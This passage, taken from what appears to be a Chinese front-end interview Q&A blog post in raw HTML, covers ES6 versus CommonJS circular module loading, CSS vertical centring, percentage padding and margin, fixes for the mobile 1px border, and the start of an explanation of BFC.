punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>执行index.js，输出结果如下：</strong></p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\">babel<span class=\"token operator\">-</span>node index<span class=\"token punctuation\">.</span>js\n\n<span class=\"token number\">1</span>\n<span class=\"token number\">2</span>\n<span class=\"token number\">3</span>\n<span class=\"token boolean\">false</span>\n<span class=\"token number\">4</span>\n<span class=\"token number\">5</span>\n<span class=\"token number\">6</span>\n<span class=\"token boolean\">true</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看出counter的值是累加的，ES6是动态引用。如果上面的引用改为CommonJS代码，会报错，因为在odd.js里，even.js代码并没有执行。改成CommonJS规范加载的代码为：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">//even.js</span>\n<span class=\"token keyword\">var</span> odd <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./odd.js'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">var</span> counter <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\nmodule<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">exports</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token function\">even</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">n</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    counter <span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>counter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> n <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> <span class=\"token function\">odd</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//odd.js</span>\n<span class=\"token keyword\">var</span> even <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./even.js'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nmodule<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">exports</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token function\">odd</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">n</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> n <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">even</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//index.js</span>\n<span class=\"token keyword\">var</span> even <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./even.js'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">var</span> x <span class=\"token operator\">=</span> <span class=\"token function\">even</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">var</span> y <span class=\"token operator\">=</span> <span class=\"token function\">even</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>执行index.js，输出结果如下：</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">$ babel-node index.js\n1\n&#x2F;Users&#x2F;name&#x2F;Projects&#x2F;node&#x2F;ES6&#x2F;odd.1.js:6\n    return n !&#x3D; 0 &amp;&amp; even(n - 1);\n                     ^\n\nTypeError: even is not a function\n    at odd (&#x2F;Users&#x2F;name&#x2F;Projects&#x2F;node&#x2F;ES6&#x2F;odd.1.js:4:22)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n<h2 id=\"Css\"><a href=\"#Css\" class=\"headerlink\" title=\"Css:\"></a>Css:</h2><h3 id=\"1、未知高度元素垂直居中、垂直居中的实现方式有哪些？\"><a href=\"#1、未知高度元素垂直居中、垂直居中的实现方式有哪些？\" class=\"headerlink\" title=\"1、未知高度元素垂直居中、垂直居中的实现方式有哪些？\"></a>1、未知高度元素垂直居中、垂直居中的实现方式有哪些？</h3><p><strong>参考答案：</strong></p>\n<p><strong>1、绝对定位+css3 transform:translate(-50%，-50%)</strong></p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">.wrap</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">position</span><span class=\"token punctuation\">:</span>relative<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token selector\">.child</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> absolute<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">top</span><span class=\"token punctuation\">:</span>50%<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">left</span><span class=\"token punctuation\">:</span>50%<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-webkit-transform</span><span class=\"token punctuation\">:</span><span class=\"token function\">translate</span><span class=\"token punctuation\">(</span>-50%<span class=\"token punctuation\">,</span>-50%<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>2、css3 的flex布局</strong></p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">.wrap</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">display</span><span class=\"token punctuation\">:</span>flex<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">justify-content</span><span class=\"token punctuation\">:</span>center<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token selector\">.child</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">align-self</span><span class=\"token punctuation\">:</span>center<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>3、table布局</strong></p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">&lt;div class=\"wrap\">\n   &lt;div class=\"child\">\n          &lt;div>sadgsdgasgd&lt;/div>\n   &lt;/div>\n&lt;/div>\n.wrap</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">display</span><span class=\"token punctuation\">:</span>table<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">text-align</span><span class=\"token punctuation\">:</span>center<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token selector\">.child</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">background</span><span class=\"token punctuation\">:</span>#ccc<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">display</span><span class=\"token punctuation\">:</span>table-cell<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">vertical-align</span><span class=\"token punctuation\">:</span>middle<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token selector\">.child div</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span>300px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span>150px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">background</span><span class=\"token punctuation\">:</span>red<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">margin</span><span class=\"token punctuation\">:</span>0 auto<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"2、padding-margin-百分比单位依据\"><a href=\"#2、padding-margin-百分比单位依据\" class=\"headerlink\" title=\"2、padding , margin 百分比单位依据\"></a>2、padding , margin 百分比单位依据</h3><p><strong>参考答案</strong>：</p>\n<p>在CSS 盒模型中，依据CSS2.2文档，margin与padding的百分比指定值时，一律参考<strong>包含盒的宽度</strong>。<br>示例：</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">.father</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 100px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 200px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">border</span><span class=\"token punctuation\">:</span> solid<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token selector\">.son</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token property\">margin</span><span class=\"token punctuation\">:</span> 20%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span> 20%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 50%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 50%<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>如下图，包括padding-top&#x2F;bottom,margin-top&#x2F;bottom在内，所有padding和margin均是参考的包含块的宽度，故它们的值为200px * 20% &#x3D; 40px。</p>\n<h3 id=\"3、移动端-1px-问题\"><a href=\"#3、移动端-1px-问题\" class=\"headerlink\" title=\"3、移动端 1px 问题\"></a>3、移动端 1px 问题</h3><p><strong>参考答案</strong>：</p>\n<p><strong>问题</strong>：1px 的边框，在高清屏下，移动端的1px 会很粗</p>\n<p><strong>产生原因</strong></p>\n<p>那么为什么会产生这个问题呢？主要是跟一个东西有关，DPR(devicePixelRatio) 设备像素比，它是默认缩放为100%的情况下，设备像素和CSS像素的比值。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">window.devicePixelRatio&#x3D;物理像素 &#x2F;CSS像素\n复制代码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>目前主流的屏幕DPR&#x3D;2 （iPhone 8）,或者3 （iPhone 8 Plus）。拿2倍屏来说，设备的物理像素要实现1像素，而DPR&#x3D;2，所以css 像素只能是 0.5。一般设计稿是按照750来设计的，它上面的1px是以750来参照的，而我们写css样式是以设备375为参照的，所以我们应该写的0.5px就好了啊！ 试过了就知道，iOS 8+系统支持，安卓系统不支持。</p>\n<p><strong>解决方案</strong></p>\n<ol>\n<li><p>WWDC对iOS统给出的方案</p>\n<p>在 WWDC大会上，给出来了1px方案，当写 0.5px的时候，就会显示一个物理像素宽度的 border，而不是一个css像素的 border。 所以在iOS下，你可以这样写。</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token property\">border</span><span class=\"token punctuation\">:</span>0.5px solid #E5E5E5<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>可能你会问为什么在3倍屏下，不是0.3333px 这样的？经过测试，在Chrome上模拟iPhone 8Plus，发现小于0.46px的时候是显示不出来。</p>\n<p><strong>总结：</strong></p>\n<ul>\n<li>优点：简单，没有副作用</li>\n<li>缺点：支持iOS 8+，不支持安卓。后期安卓follow就好了。</li>\n</ul>\n</li>\n<li><p>使用边框图片</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token property\">border</span><span class=\"token punctuation\">:</span> 1px solid transparent<span class=\"token punctuation\">;</span>\n<span class=\"token property\">border-image</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string url\">'./../../image/96.jpg'</span><span class=\"token punctuation\">)</span></span> 2 repeat<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><strong>总结：</strong></p>\n<ul>\n<li>优点：没有副作用</li>\n<li>缺点：border颜色变了就得重新制作图片；圆角会比较模糊。</li>\n</ul>\n</li>\n<li><p>使用box-shadow实现</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token property\">box-shadow</span><span class=\"token punctuation\">:</span> 0  -1px 1px -1px #e5e5e5<span class=\"token punctuation\">,</span>   //上边线\n            1px  0  1px -1px #e5e5e5<span class=\"token punctuation\">,</span>   //右边线\n            0  1px  1px -1px #e5e5e5<span class=\"token punctuation\">,</span>   //下边线\n            -1px 0  1px -1px #e5e5e5<span class=\"token punctuation\">;</span>   //左边线<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p> <strong>总结</strong></p>\n<ul>\n<li>优点：使用简单，圆角也可以实现</li>\n<li>缺点：模拟的实现方法，仔细看谁看不出来这是阴影不是边框。</li>\n</ul>\n</li>\n<li><p>使用伪元素</p>\n<p>1条border</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">.setOnePx</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> relative<span class=\"token punctuation\">;</span>\n  <span class=\"token selector\">&amp;::after</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> absolute<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">content</span><span class=\"token punctuation\">:</span> <span class=\"token string\">''</span><span class=\"token punctuation\">;</span>\n    <span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span> #e5e5e5<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">display</span><span class=\"token punctuation\">:</span> block<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 1px<span class=\"token punctuation\">;</span> <span class=\"token comment\">/*no*/</span>\n    <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">scale</span><span class=\"token punctuation\">(</span>1<span class=\"token punctuation\">,</span> 0.5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token property\">top</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">left</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看到，将伪元素设置绝对定位，并且和父元素的左上角对齐，将width 设置100%，height设置为1px，然后进行在Y方向缩小<code>0.5倍</code>。</p>\n<p>4 条border</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">.setBorderAll</span><span class=\"token punctuation\">&#123;</span>\n     <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> relative<span class=\"token punctuation\">;</span>\n       <span class=\"token selector\">&amp;:after</span><span class=\"token punctuation\">&#123;</span>\n           <span class=\"token property\">content</span><span class=\"token punctuation\">:</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">;</span>\n           <span class=\"token property\">position</span><span class=\"token punctuation\">:</span>absolute<span class=\"token punctuation\">;</span>\n           <span class=\"token property\">top</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n           <span class=\"token property\">left</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n           <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 200%<span class=\"token punctuation\">;</span>\n           <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 200%<span class=\"token punctuation\">;</span>\n           <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">scale</span><span class=\"token punctuation\">(</span>0.5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           <span class=\"token property\">transform-origin</span><span class=\"token punctuation\">:</span> left top<span class=\"token punctuation\">;</span>\n           <span class=\"token property\">box-sizing</span><span class=\"token punctuation\">:</span> border-box<span class=\"token punctuation\">;</span>\n           <span class=\"token property\">border</span><span class=\"token punctuation\">:</span> 1px solid #E5E5E5<span class=\"token punctuation\">;</span>\n           <span class=\"token property\">border-radius</span><span class=\"token punctuation\">:</span> 4px<span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>同样为伪元素设置绝对定位，并且和父元素左上角对其。将伪元素的长和宽先放大2倍，然后再设置一个边框，以左上角为中心，缩放到原来的<code>0.5倍</code></p>\n<p><strong>总结：</strong></p>\n<ul>\n<li>优点：全机型兼容，实现了真正的1px，而且可以圆角。</li>\n<li>缺点：暂用了after 伪元素，可能影响清除浮动。</li>\n</ul>\n</li>\n<li><p>设置viewport的scale值</p>\n<p>这个解决方案是利用viewport+rem+js 实现的。</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>1px question<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Content-Type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=UTF-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewport<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>WebViewport<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>        \n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\n          <span class=\"token selector\">html</span> <span class=\"token punctuation\">&#123;</span>\n              <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> 1px<span class=\"token punctuation\">;</span>\n          <span class=\"token punctuation\">&#125;</span>            \n          <span class=\"token selector\">*</span> <span class=\"token punctuation\">&#123;</span>\n              <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n              <span class=\"token property\">margin</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n          <span class=\"token punctuation\">&#125;</span>\n          <span class=\"token selector\">.top_b</span> <span class=\"token punctuation\">&#123;</span>\n              <span class=\"token property\">border-bottom</span><span class=\"token punctuation\">:</span> 1px solid #E5E5E5<span class=\"token punctuation\">;</span>\n          <span class=\"token punctuation\">&#125;</span>\n\n          <span class=\"token selector\">.a,.b</span> <span class=\"token punctuation\">&#123;</span>\n                      <span class=\"token property\">box-sizing</span><span class=\"token punctuation\">:</span> border-box<span class=\"token punctuation\">;</span>\n              <span class=\"token property\">margin-top</span><span class=\"token punctuation\">:</span> 1rem<span class=\"token punctuation\">;</span>\n              <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span> 1rem<span class=\"token punctuation\">;</span>                \n              <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> 1.4rem<span class=\"token punctuation\">;</span>\n          <span class=\"token punctuation\">&#125;</span>\n\n          <span class=\"token selector\">.a</span> <span class=\"token punctuation\">&#123;</span>\n              <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span>\n          <span class=\"token punctuation\">&#125;</span>\n\n          <span class=\"token selector\">.b</span> <span class=\"token punctuation\">&#123;</span>\n              <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> #f5f5f5<span class=\"token punctuation\">;</span>\n              <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span>\n          <span class=\"token punctuation\">&#125;</span>\n      </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n          <span class=\"token keyword\">var</span> viewport <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"meta[name=viewport]\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          <span class=\"token comment\">//下面是根据设备像素设置viewport</span>\n          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>window<span class=\"token punctuation\">.</span>devicePixelRatio <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n              viewport<span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">'content'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'width=device-width,initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          <span class=\"token punctuation\">&#125;</span>\n          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>window<span class=\"token punctuation\">.</span>devicePixelRatio <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n              viewport<span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">'content'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'width=device-width,initial-scale=0.5, maximum-scale=0.5, minimum-scale=0.5, user-scalable=no'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          <span class=\"token punctuation\">&#125;</span>\n          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>window<span class=\"token punctuation\">.</span>devicePixelRatio <span class=\"token operator\">==</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n              viewport<span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">'content'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'width=device-width,initial-scale=0.3333333333333333, maximum-scale=0.3333333333333333, minimum-scale=0.3333333333333333, user-scalable=no'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          <span class=\"token punctuation\">&#125;</span>\n          <span class=\"token keyword\">var</span> docEl <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span>documentElement<span class=\"token punctuation\">;</span>\n          <span class=\"token keyword\">var</span> fontsize <span class=\"token operator\">=</span> <span class=\"token number\">32</span><span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>docEl<span class=\"token punctuation\">.</span>clientWidth <span class=\"token operator\">/</span> <span class=\"token number\">750</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'px'</span><span class=\"token punctuation\">;</span>\n          docEl<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>fontSize <span class=\"token operator\">=</span> fontsize<span class=\"token punctuation\">;</span>\n      </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>top_b a<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>下面的底边宽度是虚拟1像素的<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>b<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>上面的边框宽度是虚拟1像素的<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>总结</strong></p>\n<ul>\n<li>优点：全机型兼容，直接写<code>1px</code>不能再方便</li>\n<li>缺点：适用于新的项目，老项目可能改动大</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"4、BFC\"><a href=\"#4、BFC\" class=\"headerlink\" title=\"4、BFC\"></a>4、BFC</h3><p><strong>参考答案</strong>：</p>\n<ol>\n<li><p><strong>简介</strong></p>\n<p>在解释BFC之前，先说一下文档流。我们常说的文档流其实分为<strong>定位流</strong>、<strong>浮动流</strong>、<strong>普通流</strong>三种。而普通流其实就是指BFC中的FC。FC(Formatting 